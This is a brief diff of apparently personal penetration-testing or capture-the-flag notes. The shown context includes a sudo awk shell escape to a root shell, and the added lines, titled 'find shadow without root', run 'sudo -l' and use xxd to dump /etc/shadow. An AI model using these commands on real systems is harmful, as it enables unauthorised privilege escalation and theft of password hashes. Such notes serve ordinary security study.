@@ -22,3 +22,9 @@ whoami
 sudo awk 'BEGIN {system("/bin/bash")}'
 id
 whoami
+
+
+find shadow without root
+sudo -l
+xxd /etc/shadow | xxd -r
+
